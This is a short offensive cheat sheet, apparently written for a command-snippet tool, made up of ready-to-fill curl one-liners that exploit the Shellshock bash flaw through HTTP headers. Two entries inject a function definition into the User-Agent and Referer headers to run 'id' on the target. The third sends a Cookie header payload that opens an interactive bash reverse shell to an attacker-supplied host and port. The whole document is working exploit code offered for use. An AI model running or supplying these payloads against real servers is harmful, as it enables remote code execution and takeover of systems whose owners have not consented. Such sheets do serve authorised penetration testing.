# Shellshock

## probes

### User-Agent id

Probe Shellshock through the User-Agent header.

```sh title:"Probe Shellshock through User-Agent"
curl -A "() { ignored; }; echo Content-Type: text/plain; echo; echo; /usr/bin/id" "$url"
```
<!-- cheat
var url
-->

### Referer id

Probe Shellshock through the Referer header.

```sh title:"Probe Shellshock through Referer"
curl -H "Referer: () { ignored; }; echo Content-Type: text/plain; echo; echo; /usr/bin/id" "$url"
```
<!-- cheat
var url
-->

### Cookie reverse shell

Trigger a reverse shell through the Cookie header.

```sh title:"Trigger Shellshock reverse shell through Cookie"
curl -H "Cookie: () { ignored; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1'" "$url"
```
<!-- cheat
var lhost
var lport
var url
-->
